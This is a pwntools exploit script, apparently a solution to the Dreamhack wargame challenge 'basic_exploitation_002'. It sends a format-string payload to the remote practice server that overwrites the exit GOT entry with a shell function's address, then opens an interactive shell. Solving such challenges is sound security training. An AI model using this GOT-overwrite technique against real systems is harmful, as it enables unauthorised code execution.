from pwn  import *

p = remote('host3.dreamhack.games', 16692)

#0x0804
#0x8609
e = ELF('./basic_exploitation_002')
exit_GOT = e.got['exit']

shell = 0x08048609
# shell_high= 0x0804
# shell_low = 0x8609

# payload = b""
# payload += p32(exit_GOT)
# payload += p32(exit_GOT + 2)

# payload += b'%1$hn'
# payload += '%{}c'.format(0x10000 + shell_high - shell_low)
# payload += b'%2hn'

payload = fmtstr_payload(1, {exit_GOT:shell})

p.sendline(payload)
p.interactive()